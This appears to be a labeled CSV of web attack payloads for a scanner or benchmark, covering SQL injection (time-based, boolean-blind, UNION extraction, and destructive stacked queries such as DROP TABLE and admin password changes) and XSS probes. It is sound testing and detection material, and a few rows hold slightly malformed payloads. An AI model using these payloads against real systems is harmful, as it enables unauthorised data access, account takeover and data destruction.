id,label,attack_class,type,payload,context,context_bucket,severity,severity_original,severity_reason,is_destructive,destructive_flags,oracle,description,example
sqli-039,attack,sqli,blind-time,' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(3))--,User input,form_field,high,medium,base sqli/blind-time=high,False,[],timing,Using OR with sleep for time delay in Oracle with comment,SELECT * FROM users WHERE username = '' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(3))--
sqli-040,attack,sqli,stacked-queries,"'; INSERT INTO users (username, password) VALUES ('attacker', 'pass')--",User input,form_field,critical,critical,base sqli/stacked-queries=critical; destructive ['sql_write'] -> critical,True,['sql_write'],timing,Using stacked queries to insert data,"SELECT * FROM users WHERE username = ''; INSERT INTO users (username, password) VALUES ('attacker', 'pass')--"
sqli-041,attack,sqli,blind-time,' OR SLEEP(8)/*,Search input,search_field,high,medium,base sqli/blind-time=high,False,[],timing,Using OR with sleep for time delay in MySQL with inline comment,SELECT * FROM products WHERE name = '' OR SLEEP(8)/*
sqli-043,attack,sqli,boolean-blind,"' OR SUBSTRING(user(),1,1)='a'/*",Login input,login_form,high,medium,base sqli/boolean-blind=high,False,[],differential,Using OR with substring for blind boolean injection with inline comment,"SELECT * FROM users WHERE username = '' OR SUBSTRING(user(),1,1)='a'/*"
sqli-044,attack,sqli,stacked-queries,'; UPDATE users SET password='hacked' WHERE username='admin'--,User input,form_field,critical,critical,base sqli/stacked-queries=critical; destructive ['sql_write'] -> critical,True,['sql_write'],timing,Using stacked queries to update data,SELECT * FROM users WHERE username = ''; UPDATE users SET password='hacked' WHERE username='admin'--
sqli-045,attack,sqli,blind-time,' OR pg_sleep(6)/*,ID parameter,url_param,high,medium,base sqli/blind-time=high,False,[],timing,Using OR with sleep for time delay in PostgreSQL with inline comment,SELECT * FROM orders WHERE id = '' OR pg_sleep(6)/*
sqli-046,attack,sqli,union,"' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--",Search input,search_field,high,high,base sqli/union=high,False,[],marker_reflection,Using UNION SELECT to extract column names,"SELECT name, description FROM products WHERE name = '' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--"
sqli-047,attack,sqli,tautology,' OR CAST('1' AS INT)=1--,Login form,login_form,high,medium,base sqli/tautology=high,False,[],differential,Using OR with cast for tautology,SELECT * FROM users WHERE username = '' OR CAST('1' AS INT)=1--
sqli-048,attack,sqli,blind-time,'; WAITFOR DELAY '0:0:7'/*,User ID input,url_param,high,medium,base sqli/blind-time=high,False,[],timing,Using OR with sleep for time delay in SQL Server with inline comment,SELECT * FROM users WHERE id = ''; WAITFOR DELAY '0:0:7'/*
sqli-049,attack,sqli,boolean-blind,"' OR SUBSTRING(@@version,1,1)='8'#",Search input,search_field,high,medium,base sqli/boolean-blind=high,False,[],differential,Using OR with substring for blind boolean injection with hash comment,"SELECT * FROM products WHERE name = '' OR SUBSTRING(@@version,1,1)='8'#"
sqli-051,attack,sqli,blind-time,' OR 1=(SELECT COUNT() FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(7))/,User input,form_field,high,medium,base sqli/blind-time=high,False,[],timing,Using OR with sleep for time delay in Oracle with inline comment,SELECT * FROM users WHERE username = '' OR 1=(SELECT COUNT() FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(7))/
sqli-052,attack,sqli,stacked-queries,'; DELETE FROM users WHERE username='guest'--,User input,form_field,critical,critical,base sqli/stacked-queries=critical; destructive ['sql_write'] -> critical,True,['sql_write'],timing,Using stacked queries to delete data,SELECT * FROM users WHERE username = ''; DELETE FROM users WHERE username='guest'--
sqli-053,attack,sqli,tautology,' OR 0x31=0x31--,Login username,login_form,high,medium,base sqli/tautology=high,False,[],differential,Using OR with hex encoded tautology,SELECT * FROM users WHERE username = '' OR 0x31=0x31--
sqli-054,attack,sqli,blind-time,' OR SLEEP(9)#,Search input,search_field,high,medium,base sqli/blind-time=high,False,[],timing,Using OR with sleep for time delay in MySQL with hash comment,SELECT * FROM products WHERE name = '' OR SLEEP(9)#
sqli-055,attack,sqli,union,"' UNION SELECT schema_name, NULL FROM information_schema.schemata--",Search input,search_field,high,high,base sqli/union=high,False,[],marker_reflection,Using UNION SELECT to extract schema names,"SELECT name, description FROM products WHERE name = '' UNION SELECT schema_name, NULL FROM information_schema.schemata--"
sqli-056,attack,sqli,blind-time,' OR pg_sleep(4)#,ID parameter,url_param,high,medium,base sqli/blind-time=high,False,[],timing,Using OR with sleep for time delay in PostgreSQL with hash comment,SELECT * FROM orders WHERE id = '' OR pg_sleep(4)#
sqli-057,attack,sqli,tautology,' OR CAST(1 AS INT)=1/*,Login form,login_form,high,medium,base sqli/tautology=high,False,[],differential,Using OR with cast for tautology with inline comment,SELECT * FROM users WHERE username = '' OR CAST(1 AS INT)=1/*
sqli-058,attack,sqli,boolean-blind,"' OR SUBSTRING(user(),1,1)='b'/*",Search input,search_field,high,medium,base sqli/boolean-blind=high,False,[],differential,Using OR with substring for blind boolean injection with inline comment,"SELECT * FROM products WHERE name = '' OR SUBSTRING(user(),1,1)='b'/*"
sqli-060,attack,sqli,stacked-queries,"'; INSERT INTO users (username, password) VALUES ('newuser', 'pass123')--",User input,form_field,critical,critical,base sqli/stacked-queries=critical; destructive ['sql_write'] -> critical,True,['sql_write'],timing,Using stacked queries to create new user,"SELECT * FROM users WHERE username = ''; INSERT INTO users (username, password) VALUES ('newuser', 'pass123')--"
sqli-061,attack,sqli,blind-time,'; WAITFOR DELAY '0:0:5'#,User ID input,url_param,high,medium,base sqli/blind-time=high,False,[],timing,Using OR with sleep for time delay in SQL Server with hash comment,SELECT * FROM users WHERE id = ''; WAITFOR DELAY '0:0:5'#
sqli-062,attack,sqli,boolean-blind,"' OR SUBSTRING(@@version,1,1)='9'#",Search input,search_field,high,medium,base sqli/boolean-blind=high,False,[],differential,Using OR with substring for blind boolean injection with hash comment,"SELECT * FROM products WHERE name = '' OR SUBSTRING(@@version,1,1)='9'#"
sqli-064,attack,sqli,blind-time,' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(4))#,User input,form_field,high,medium,base sqli/blind-time=high,False,[],timing,Using OR with sleep for time delay in Oracle with hash comment,SELECT * FROM users WHERE username = '' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(4))#
sqli-065,attack,sqli,stacked-queries,'; DROP TABLE sessions--,User input,form_field,critical,critical,base sqli/stacked-queries=critical; destructive ['sql_write'] -> critical,True,['sql_write'],timing,Using stacked queries to drop table,SELECT * FROM users WHERE username = ''; DROP TABLE sessions--
sqli-066,attack,sqli,tautology,' OR 0x41=0x41--,Login username,login_form,high,medium,base sqli/tautology=high,False,[],differential,Using OR with hex encoded tautology with comment,SELECT * FROM users WHERE username = '' OR 0x41=0x41--
sqli-067,attack,sqli,blind-time,' OR SLEEP(11)--,Search input,search_field,high,medium,base sqli/blind-time=high,False,[],timing,Using OR with sleep for time delay in MySQL with double dash comment,SELECT * FROM products WHERE name = '' OR SLEEP(11)--
sqli-069,attack,sqli,blind-time,' OR pg_sleep(12)--,ID parameter,url_param,high,medium,base sqli/blind-time=high,False,[],timing,Using OR with sleep for time delay in PostgreSQL with double dash comment,SELECT * FROM orders WHERE id = '' OR pg_sleep(12)--
sqli-070,attack,sqli,stacked-queries,'; UPDATE users SET password='newpass' WHERE username='admin'--,User input,form_field,critical,critical,base sqli/stacked-queries=critical; destructive ['sql_write'] -> critical,True,['sql_write'],timing,Using stacked queries to update admin password,SELECT * FROM users WHERE username = ''; UPDATE users SET password='newpass' WHERE username='admin'--
sqli-071,attack,sqli,blind-time,' OR SLEEP(12)--,Search input,search_field,high,medium,base sqli/blind-time=high,False,[],timing,Using OR with sleep for time delay in MySQL with double dash comment,SELECT * FROM products WHERE name = '' OR SLEEP(12)--
sqli-072,attack,sqli,union,"' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='orders'--",Search input,search_field,high,high,base sqli/union=high,False,[],marker_reflection,Using UNION SELECT to extract column names with comment,"SELECT name, description FROM products WHERE name = '' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='orders'--"
sqli-073,attack,sqli,boolean-blind,"' OR SUBSTRING(user(),1,1)='c'--",Login input,login_form,high,medium,base sqli/boolean-blind=high,False,[],differential,Using OR with substring for blind boolean injection with double dash comment,"SELECT * FROM users WHERE username = '' OR SUBSTRING(user(),1,1)='c'--"
sqli-074,attack,sqli,stacked-queries,"'; INSERT INTO users (username, password, role) VALUES ('admin2', 'pass123', 'admin')--",User input,form_field,critical,critical,base sqli/stacked-queries=critical; destructive ['sql_write'] -> critical,True,['sql_write'],timing,Using stacked queries to insert admin user,"SELECT * FROM users WHERE username = ''; INSERT INTO users (username, password, role) VALUES ('admin2', 'pass123', 'admin')--"
sqli-075,attack,sqli,blind-time,' OR pg_sleep(8)--,ID parameter,url_param,high,medium,base sqli/blind-time=high,False,[],timing,Using OR with sleep for time delay in PostgreSQL with double dash comment,SELECT * FROM orders WHERE id = '' OR pg_sleep(8)--
sqli-076,attack,sqli,union,"' UNION SELECT @@version, NULL--",Search input,search_field,high,high,base sqli/union=high,False,[],marker_reflection,Using UNION SELECT to extract database version,"SELECT name, description FROM products WHERE name = '' UNION SELECT @@version, NULL--"
sqli-078,attack,sqli,blind-time,'; WAITFOR DELAY '0:0:8'--,User ID input,url_param,high,medium,base sqli/blind-time=high,False,[],timing,Using OR with sleep for time delay in SQL Server with double dash comment,SELECT * FROM users WHERE id = ''; WAITFOR DELAY '0:0:8'--
sqli-079,attack,sqli,boolean-blind,"' OR SUBSTRING(@@version,1,1)='7'--",Search input,search_field,high,medium,base sqli/boolean-blind=high,False,[],differential,Using OR with substring for blind boolean injection with double dash comment,"SELECT * FROM products WHERE name = '' OR SUBSTRING(@@version,1,1)='7'--"
sqli-081,attack,sqli,blind-time,' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(8))--,User input,form_field,high,medium,base sqli/blind-time=high,False,[],timing,Using OR with sleep for time delay in Oracle with double dash comment,SELECT * FROM users WHERE username = '' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(8))--
sqli-082,attack,sqli,stacked-queries,'; DELETE FROM users WHERE username='admin'--,User input,form_field,critical,critical,base sqli/stacked-queries=critical; destructive ['sql_write'] -> critical,True,['sql_write'],timing,Using stacked queries to delete admin user,SELECT * FROM users WHERE username = ''; DELETE FROM users WHERE username='admin'--
sqli-083,attack,sqli,tautology,' OR 0x42=0x42--,Login username,login_form,high,medium,base sqli/tautology=high,False,[],differential,Using OR with hex encoded tautology with double dash comment,SELECT * FROM users WHERE username = '' OR 0x42=0x42--
sqli-084,attack,sqli,blind-time,' OR SLEEP(13)--,Search input,search_field,high,medium,base sqli/blind-time=high,False,[],timing,Using OR with sleep for time delay in MySQL with double dash comment,SELECT * FROM products WHERE name = '' OR SLEEP(13)--
sqli-086,attack,sqli,blind-time,' OR pg_sleep(14)--,ID parameter,url_param,high,medium,base sqli/blind-time=high,False,[],timing,Using OR with sleep for time delay in PostgreSQL with double dash comment,SELECT * FROM orders WHERE id = '' OR pg_sleep(14)--
sqli-088,attack,sqli,boolean-blind,"' OR SUBSTRING(user(),1,1)='d'--",Search input,search_field,high,medium,base sqli/boolean-blind=high,False,[],differential,Using OR with substring for blind boolean injection with double dash comment,"SELECT * FROM products WHERE name = '' OR SUBSTRING(user(),1,1)='d'--"
sqli-090,attack,sqli,stacked-queries,"'; INSERT INTO users (username, password, role) VALUES ('superadmin', 'pass456', 'admin')--",User input,form_field,critical,critical,base sqli/stacked-queries=critical; destructive ['sql_write'] -> critical,True,['sql_write'],timing,Using stacked queries to create new admin user,"SELECT * FROM users WHERE username = ''; INSERT INTO users (username, password, role) VALUES ('superadmin', 'pass456', 'admin')--"
sqli-091,attack,sqli,blind-time,'; WAITFOR DELAY '0:0:9'--,User ID input,url_param,high,medium,base sqli/blind-time=high,False,[],timing,Using OR with sleepfor time delay in SQL Server with double dash comment,SELECT * FROM users WHERE id = ''; WAITFOR DELAY '0:0:9'--
sqli-092,attack,sqli,boolean-blind,"' OR SUBSTRING(@@version,1,1)='6'--",Search input,search_field,high,medium,base sqli/boolean-blind=high,False,[],differential,Using OR with substring for blind boolean injection with double dash comment,"SELECT * FROM products WHERE name = '' OR SUBSTRING(@@version,1,1)='6'--"
sqli-094,attack,sqli,blind-time,' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(9))--,User input,form_field,high,medium,base sqli/blind-time=high,False,[],timing,Using OR with sleep for time delay in Oracle with double dash comment,SELECT * FROM users WHERE username = '' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(9))--
sqli-096,attack,sqli,tautology,' OR 0x43=0x43--,Login username,login_form,high,medium,base sqli/tautology=high,False,[],differential,Using OR with hex encoded tautology with double dash comment,SELECT * FROM users WHERE username = '' OR 0x43=0x43--
sqli-097,attack,sqli,blind-time,' OR SLEEP(14)--,Search input,search_field,high,medium,base sqli/blind-time=high,False,[],timing,Using OR with sleep for time delay in MySQL with double dash comment,SELECT * FROM products WHERE name = '' OR SLEEP(14)--
sqli-099,attack,sqli,blind-time,' OR pg_sleep(15)--,ID parameter,url_param,high,medium,base sqli/blind-time=high,False,[],timing,Using OR with sleep for time delay in PostgreSQL with double dash comment,SELECT * FROM orders WHERE id = '' OR pg_sleep(15)--
sqli-100,attack,sqli,stacked-queries,'; UPDATE users SET password='securepass' WHERE username='admin'--,User input,form_field,critical,critical,base sqli/stacked-queries=critical; destructive ['sql_write'] -> critical,True,['sql_write'],timing,Using stacked queries to update admin password with double dash comment,SELECT * FROM users WHERE username = ''; UPDATE users SET password='securepass' WHERE username='admin'--
xss-001,attack,xss,reflected,<script>alert('XSS1')</script>,URL parameter,url_param,medium,high,base xss/reflected=medium,False,[],browser_execution,Basic reflected XSS with script tag,http://example.com/search?q=<script>alert('XSS1')</script>
xss-002,attack,xss,reflected,<img src=x onerror=alert('XSS2')>,URL parameter,url_param,medium,high,base xss/reflected=medium,False,[],browser_execution,Reflected XSS with image tag and onerror event,http://example.com/search?q=<img src=x onerror=alert('XSS2')>
xss-003,attack,xss,stored,<script>alert('XSS3')</script>,Comment input,comment_field,high,high,base xss/stored=high,False,[],browser_execution,Stored XSS with script tag in comment field,Submitting comment: <script>alert('XSS3')</script>
xss-004,attack,xss,reflected,"<a href='javascript:alert(""XSS4"")'>click</a>",URL parameter,url_param,medium,high,base xss/reflected=medium,False,[],browser_execution,Reflected XSS with javascript: URI in anchor tag,"http://example.com/page?link=<a href='javascript:alert(""XSS4"")'>click</a>"
xss-005,attack,xss,reflected,<input autofocus onfocus=alert('XSS5')>,URL parameter,url_param,medium,high,base xss/reflected=medium,False,[],browser_execution,Reflected XSS with input tag and onfocus event,http://example.com/search?q=<input autofocus onfocus=alert('XSS5')>
xss-006,attack,xss,stored,"<iframe src='javascript:alert(""XSS6"")'></iframe>",User profile bio,comment_field,high,high,base xss/stored=high,False,[],browser_execution,Stored XSS with iframe tag,"User bio: <iframe src='javascript:alert(""XSS6"")'></iframe>"
xss-007,attack,xss,reflected,<svg onload=alert('XSS7')>,URL parameter,url_param,medium,high,base xss/reflected=medium,False,[],browser_execution,Reflected XSS with SVG and onload event,http://example.com/search?q=<svg onload=alert('XSS7')>
xss-008,attack,xss,reflected,<body onload=alert('XSS8')>,URL parameter,url_param,medium,high,base xss/reflected=medium,False,[],browser_execution,Reflected XSS with body tag and onload event,http://example.com/page?param=<body onload=alert('XSS8')>
xss-009,attack,xss,stored,<div onclick=alert('XSS9')>Click me</div>,User input field,form_field,high,high,base xss/stored=high,False,[],browser_execution,Stored XSS with event handler in div tag,User input: <div onclick=alert('XSS9')>Click me</div>
xss-010,attack,xss,reflected,"<meta http-equiv='refresh' content='0;url=javascript:alert(""XSS10"")'>",URL parameter,url_param,medium,high,base xss/reflected=medium,False,[],browser_execution,Reflected XSS with meta refresh tag,"http://example.com/page?param=<meta http-equiv='refresh' content='0;url=javascript:alert(""XSS10"")'>"
xss-011,attack,xss,reflected,"<style>body{background:url(""javascript:alert('XSS11')"")}</style>",URL parameter,url_param,medium,high,base xss/reflected=medium,False,[],browser_execution,Reflected XSS with style tag and expression,"http://example.com/page?param=<style>body{background:url(""javascript:alert('XSS11')"")}</style>"
xss-012,attack,xss,reflected,%3Cscript%3Ealert('XSS12')%3C/script%3E,URL parameter,url_param,medium,high,base xss/reflected=medium,False,[],browser_execution,Reflected XSS with script tag and encoded payload,http://example.com/search?q=%3Cscript%3Ealert('XSS12')%3C/script%3E
xss-013,attack,xss,stored,<span onmouseover=alert('XSS13')>Hover me</span>,User input field,form_field,high,high,base xss/stored=high,False,[],browser_execution,Stored XSS with onmouseover event in span tag,User input: <span onmouseover=alert('XSS13')>Hover me</span>
xss-014,attack,xss,reflected,"<iframe srcdoc=""<script>alert('XSS14')</script>""></iframe>",URL parameter,url_param,medium,high,base xss/reflected=medium,False,[],browser_execution,Reflected XSS with iframe and srcdoc attribute,"http://example.com/page?param=<iframe srcdoc=""<script>alert('XSS14')</script>""></iframe>"
xss-015,attack,xss,reflected,"<object data='javascript:alert(""XSS15"")'></object>",URL parameter,url_param,medium,high,base xss/reflected=medium,False,[],browser_execution,Reflected XSS with object tag and data attribute,"http://example.com/page?param=<object data='javascript:alert(""XSS15"")'></object>"
xss-016,attack,xss,stored,<form onsubmit=alert('XSS16')><input type='submit'></form>,User input field,form_field,high,high,base xss/stored=high,False,[],browser_execution,Stored XSS with form tag and onsubmit event,User input: <form onsubmit=alert('XSS16')><input type='submit'></form>
xss-017,attack,xss,reflected,<video src=x onerror=alert('XSS17')></video>,URL parameter,url_param,medium,high,base xss/reflected=medium,False,[],browser_execution,Reflected XSS with video tag and onerror event,http://example.com/page?param=<video src=x onerror=alert('XSS17')></video>
xss-018,attack,xss,reflected,<audio src=x onerror=alert('XSS18')></audio>,URL parameter,url_param,medium,high,base xss/reflected=medium,False,[],browser_execution,Reflected XSS with audio tag and onerror event,http://example.com/page?param=<audio src=x onerror=alert('XSS18')></audio>
